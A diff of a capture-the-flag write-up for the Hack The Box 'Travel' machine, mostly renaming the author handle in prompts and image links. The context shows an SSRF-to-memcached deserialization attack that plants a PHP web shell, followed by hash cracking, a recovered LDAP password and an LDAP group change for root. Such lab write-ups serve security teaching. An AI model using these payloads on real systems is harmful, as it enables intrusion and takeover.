@@ -9,6 +9,7 @@ avatar: assets/htb/travel.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Travel
 ---
+
 ## HTB - Travel
 
 ### Overview
@@ -30,7 +31,7 @@ htb_url: https://app.hackthebox.com/machines/Travel
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oG <name>` saves the output with a filename of `<name>`, `-n` stops DNS resolution of hosts, and `-v` allows me to see progress as it discovers things rather than waiting for the full report when it finishes.
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ nmap -n -p- -sC -sV --reason -v <YOUR_IP> -oG travel
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 17:17 EDT
 
@@ -131,38 +132,38 @@ I found a potentially accessible git repo while scanning `blog-dev` with dirbust
 _The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck. After telling it to ignore those directories it found the `git` directory._
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ python3 ~/.local/bin/git-dumper/git-dumper.py http://blog-dev.travel.htb/ gitdump
 ```
 
 I made a folder named `gitdump` to dump the contents of the git repo into and ran `git-dumper` \(from [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)\) to clone the repository.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel/gitdump]
+┌──(kac0㉿kali)-[~/htb/travel/gitdump]
 └─$ ls -la          
 total 24
-drwxr-xr-x 3 zweilos zweilos 4096 Sep 18 20:21 .
-drwxr-xr-x 4 zweilos zweilos 4096 Sep 18 20:17 ..
-drwxr-xr-x 7 zweilos zweilos 4096 Sep 18 20:21 .git
--rwxr-xr-x 1 zweilos zweilos  540 Sep 18 20:21 README.md
--rwxr-xr-x 1 zweilos zweilos 2970 Sep 18 20:21 rss_template.php
--rwxr-xr-x 1 zweilos zweilos 1387 Sep 18 20:21 template.php
+drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 .
+drwxr-xr-x 4 kac0 kac0 4096 Sep 18 20:17 ..
+drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 .git
+-rwxr-xr-x 1 kac0 kac0  540 Sep 18 20:21 README.md
+-rwxr-xr-x 1 kac0 kac0 2970 Sep 18 20:21 rss_template.php
+-rwxr-xr-x 1 kac0 kac0 1387 Sep 18 20:21 template.php
 
-┌──(zweilos㉿kali)-[~/htb/travel/gitdump]
+┌──(kac0㉿kali)-[~/htb/travel/gitdump]
 └─$ ls -la .git
 total 48
-drwxr-xr-x 7 zweilos zweilos 4096 Sep 18 20:21 .
-drwxr-xr-x 3 zweilos zweilos 4096 Sep 18 20:21 ..
--rw-r--r-- 1 zweilos zweilos   13 Sep 18 20:21 COMMIT_EDITMSG
--rw-r--r-- 1 zweilos zweilos   92 Sep 18 20:21 config
--rw-r--r-- 1 zweilos zweilos   73 Sep 18 20:21 description
--rw-r--r-- 1 zweilos zweilos   23 Sep 18 20:21 HEAD
-drwxr-xr-x 2 zweilos zweilos 4096 Sep 18 20:21 hooks
--rw-r--r-- 1 zweilos zweilos  297 Sep 18 20:21 index
-drwxr-xr-x 2 zweilos zweilos 4096 Sep 18 20:21 info
-drwxr-xr-x 3 zweilos zweilos 4096 Sep 18 20:21 logs
-drwxr-xr-x 7 zweilos zweilos 4096 Sep 18 20:21 objects
-drwxr-xr-x 3 zweilos zweilos 4096 Sep 18 20:21 ref
+drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 .
+drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 ..
+-rw-r--r-- 1 kac0 kac0   13 Sep 18 20:21 COMMIT_EDITMSG
+-rw-r--r-- 1 kac0 kac0   92 Sep 18 20:21 config
+-rw-r--r-- 1 kac0 kac0   73 Sep 18 20:21 description
+-rw-r--r-- 1 kac0 kac0   23 Sep 18 20:21 HEAD
+drwxr-xr-x 2 kac0 kac0 4096 Sep 18 20:21 hooks
+-rw-r--r-- 1 kac0 kac0  297 Sep 18 20:21 index
+drwxr-xr-x 2 kac0 kac0 4096 Sep 18 20:21 info
+drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 logs
+drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 objects
+drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 ref
 ```
 
 The repository appeared to be the source code for the Awesome RSS application I saw earlier. The `README.md` file described the current status of the project.
@@ -191,32 +192,32 @@ Allows rss-feeds to be shown on a custom wordpress page.
 - finish logging implementation
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-memcache.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-memcache.png)
 
 The PHP file `rss_template.php` parses URLs and then creates SimplePie objects from them and sets that object's cache location to a local memcache. SimplePie is a WordPress plugin that allows for RSS feeds in php-based sites. . Feeds are requested from the `custom_feed_url` parameter if it exists, otherwise it defaults to `http://www.travel.htb/newsfeed/customfeed.xml` which I found earlier through dirbuster.
 
 [Memcached](https://memcached.org/) is used to cache requests in memory in the form of key-value pairs so that they can be retrieved quickly without making multiple requests. In this instance the memcache keys are prefixed with `xct_` when they are stored.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-ips.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-ips.png)
 
 There was further evidence of website security in the file `template.php`. It looked like they were trying to implement a rudimentary web application firewall by filtering out any requests that contained `file://`, `@`, `-o`, `-F`, or attempts to access the localhost. Even though some URL filtering is used, there are still many ways to bypass this. For example, `ftp://` or even `gopher://` could be used instead of `file://`, and if the localhost needs to be directly referenced different encoding schemes could be used. For example, 127.0.0.1 in hex is `0x7F000001`, and in decimal `2130706433`. Most URL parsers can automatically translate addresses no matter which numbering scheme is used.
 
 The TemplateHelper class uses the `file_put_contents()` function to write data to a file in the `/logs/` directory. This method is called from the `__construct()` and `__wakeup()` functions through the `init()` function. These two functions are known as "[magic methods](https://www.php.net/manual/en/language.oop5.magic.php)" in PHP and are triggered when certain actions happen. For example, the `__wakeup()` method is called when an object is deserialized. Since these are public functions, they can be called from other PHP files that reference this document, such as seen in `rss_template.php`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12.5-debug.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12.5-debug.png)
 
 The `rss_template.php` also has code that includes a `debug.php` if the parameter `debug` is set. This is what I had seen in the source code of the `/awesome-rss` site. After noticing this in the PHP code I went back to the same page to see if I could trigger this to do something. I set the debug flag by typing `http://blog.travel.htb/awesome-rss?debug` in the URL bar and got back something different in the page's source code than before.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14.5-debug.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14.5-debug.png)
 
 Using the `debug` parameter added a bit of deserialized PHP code to the middle of the page, but there was nothing that seemed immediately useful. I did notice that the key portion of the output was prefixed with `_xct` like described in the PHP code.
 
 The `url_get_contents()` function in `rss_template.php` allows for the import of a custom URL through the `custom_feed_url` attribute, so I hosted a web server using python SimpleHTTPServer and accessed my test page by loaded my custom URL using this link: [http://blog.travel.htb/awesome-rss/?custom\_feed\_url=http://10.10.15.53:8090/test.html](http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.15.53:8090/test.html)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-blank-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-blank-test.png)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ python -m SimpleHTTPServer 8090
 Serving HTTP on 0.0.0.0 port 8090 ...
 <YOUR_IP> - - [18/Sep/2020 20:59:47] "GET / HTTP/1.1" 200 -
@@ -232,11 +233,11 @@ Unfortunately the test did not actually load anything on the page, though I noti
 
 This confirmed the SSRF vulnerability that the rudimentary PHP WAF was trying to protect against, though I still needed to figure out how to make it run code. Storing it in the memcached key that I saw being loaded through `debug.php` seemed like a likely route. Since directly referencing file includes in a URL using the most common methods were blocked, I needed to to use a less common method. Searching for SSRF file inclusion bypass led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16.5-memcached-vuln.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16.5-memcached-vuln.png)
 
 This presentation from Black Hat included one case study where the researcher found a vulnerability where they were able to use SSRF to exploit Memcached. This example looked like exactly what I needed.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-internal-memcached-short.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-internal-memcached-short.png)
 
 From `rss_template.php` I found the syntax to connect including the address `127.0.0.1:11211`. Since the data to be included has to come from the local machine, I needed a way to embed it without pulling files from my machine. After doing some research, I decided to try doing this using the [gopher protocol](https://en.wikipedia.org/wiki/Gopher_%28protocol%29). Gopher is an older protocol that is used to access resources over a network but is still supported by most browsers as well as tools such as cURL.  The Gopher protocol was first described in [RFC 1436](https://tools.ietf.org/html/rfc1436). IANA assigned it TCP port 70, though this is rarely ever used.
 
@@ -266,19 +267,19 @@ My test key was successfully cached! Now I had to see if I could use this to exp
 Beware, the following section is a labyrinthine mess of tracing function calls across multiple libraries and classes.  I'll try to explain as best I can, but if you would rather skip this section click [here](travel-write-up.md#crafting-the-payload).
 {% endhint %}
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-memcached-short.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-memcached-short.png)
 
 [https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php)
 
 I didn't have to look through the code long to find the relevant code.  The `__construct` function from the `SimplePie_Cache_Memcached` class is what is called by the `get_feed()` function in the website's code.  It looked like they had left the default host and port values, but had customized the `timeout` and `prefix` values.  This code further explained what was actually stored in the memcached key. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16.75-memcached-cache.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16.75-memcached-cache.png)
 
 I also decided to check in `Misc.php` and `Cache.php` since they were referenced in the `Memcache.php` code. `Cache.php` has a `get_handler` function which returns an object based on the type of handler requested. One of the handlers is `SimplePie_Cache_Memcached`. In this the `$name` variable is set to `$filename` and the `$type` variable is set to `$extension`.
 
 Looking back at the source code of `Memcached.php`, I traced through what was going on. This function takes the MD5 hash of `$name` \(filename\) and `$type` \(extension\)  together. The prefix \(in this case `_xct`\) is added to the front afterwards. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-cache-handler-link.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-cache-handler-link.png)
 
 I spent awhile looking for the proper usage of this method, but finally came across Class-SimplePie.php. 
 
@@ -288,7 +289,7 @@ $cache = $this->registry->call('Cache', 'get_handler', array($this- cache_locati
 
 This code calls the `get_handler()` function from `Cache.php` with the parameters `cache_location` ,`cache_name_function($url)`, and a filetype of `spc`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-cache-name.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-cache-name.png)
 
 After searching inside the SimplePie class for `$cache_name_function` I found a small function that set it  to `md5`.  
 
@@ -301,11 +302,11 @@ _It took me a few tries to get the right URL.  First I tried just the part after
 ### Crafting the payload
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
 3903a76d1e6fef0d76e973a0561cbfc0  -
 
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ echo -n '3903a76d1e6fef0d76e973a0561cbfc0:spc' | md5sum  
 4e5612ba079c530a6b1f148c0b352241  -
 ```
@@ -348,13 +349,13 @@ This PHP script [serializes](https://www.w3schools.com/PHP/func_var_serialize.as
 > Next, we need to set this payload as a value for the key `xct_4e5612ba079c530a6b1f148c0b352241` so that it is deserialized when the debug method is called.
 
 ```php
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ php -f test.php
                                                                                  1 ⨯
-PHP Warning:  file_put_contents(/home/zweilos/htb/travel/logs/back_door.php): failed to open stream: No such file or directory in /home/zweilos/htb/travel/test.php on line 14
+PHP Warning:  file_put_contents(/home/kac0/htb/travel/logs/back_door.php): failed to open stream: No such file or directory in /home/kac0/htb/travel/test.php on line 14
 O:14:"TemplateHelper":2:{s:4:"file";s:13:"back_door.php";s:4:"data";s:34:"<?php system($_REQUEST['test']);?>";}                                                                                                        
 
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ Gopherus/gopherus.py --exploit phpmemcache
 
   ________              .__                                                                             
@@ -394,7 +395,7 @@ http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%
 After that it took awhile to figure out where my `back_door.php` was located. I found a hint in the README.md file I had found in the git repository earlier: `* create logs directory in wp-content/themes/twentytwenty` after that the TemplateHelper class told me it was stored in the `/logs/` folder. 
 
 {% hint style="info" %}
- If you look closely at the output when I ran my PHP code above, it tried to put the resultant file in the **`/home/zweilos/htb/travel/logs/`** which did not exist, so it gave an error.
+ If you look closely at the output when I ran my PHP code above, it tried to put the resultant file in the **`/home/kac0/htb/travel/logs/`** which did not exist, so it gave an error.
 {% endhint %}
 
 a shell can be obtained by using parameter on the backdoor:
@@ -467,7 +468,7 @@ admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
 ```
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ hash-identifier 
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -492,7 +493,7 @@ Possible Hashs:
 [https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/](https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/) tells me the correct hash type to use for hashcat is m=400
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ hashcat -O -D1,2 -a0 -m400 travel-hashes /usr/share/wordlists/rockyou.txt                     130 ⨯
 hashcat (v6.1.1) starting...
 
@@ -530,7 +531,7 @@ Unfortunately I was only able to crack one of the hashes. The password for `lyni
 ### Road to User
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ ssh lynik-admin@<YOUR_IP>                                                                  255 ⨯
 lynik-admin@<YOUR_IP>'s password: 
 Permission denied, please try again.
@@ -570,7 +571,7 @@ I tried to see what `lynik-admin` could do with sudo, but apparently this user w
 lynik-admin@travel:~$ ls
 user.txt
 lynik-admin@travel:~$ cat user.txt 
-c568****7230
+c568************************7230
 ```
 
 ## Path to Power \(Gaining Root Access\)
@@ -600,7 +601,7 @@ BASE dc=travel,dc=htb
 BINDDN cn=lynik-admin,dc=travel,dc=htb
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/22-vim-delete.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/22-vim-delete.png)
 
 this file is used to store Vim history data. You can find recent files, deleted data, and search history here.There is a line which was deleted from the .ldaprc file. bind password = `Theroadlesstraveled` . Let's try using it to connect to LDAP.
 
@@ -930,9 +931,9 @@ ff02::2 ip6-allrouters
 checked `ip a` and /etc/hosts to find out more and noticed 172.20.0.10
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ sudo ssh -L 389:172.20.0.10:389 lynik-admin@<YOUR_IP> 
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
 The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:KSjh2mhuESUZQcaB1ewLHie9gTUCmvOlypvBpcyAF/w.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -972,7 +973,7 @@ pictures
 ## enumeration as `lynik`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ ssh lynik@<YOUR_IP> -i lynik 
 Creating directory '/home@TRAVEL/lynik'.
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
@@ -1076,7 +1077,7 @@ sssd:x:118:
 I checked sudoers file and saw that admins and members of sudo group can run all commands as root so I changed group id to 27 \(sudo\) then logout and back in
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ ssh lynik@<YOUR_IP> -i lynik
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
@@ -1100,7 +1101,7 @@ See "man sudo_root" for details.
 lynik@travel:~$ id
 uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)
 
-┌──(zweilos㉿kali)-[~/htb/travel]
+┌──(kac0㉿kali)-[~/htb/travel]
 └─$ ssh lynik@<YOUR_IP> -i lynik
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
@@ -1140,5 +1141,5 @@ User lynik may run the following commands on travel:
     (ALL : ALL) ALL
 lynik@travel:~$ sudo su -
 root@travel:~# cat root.txt 
-5500****5eb0
+5500************************5eb0
 ```
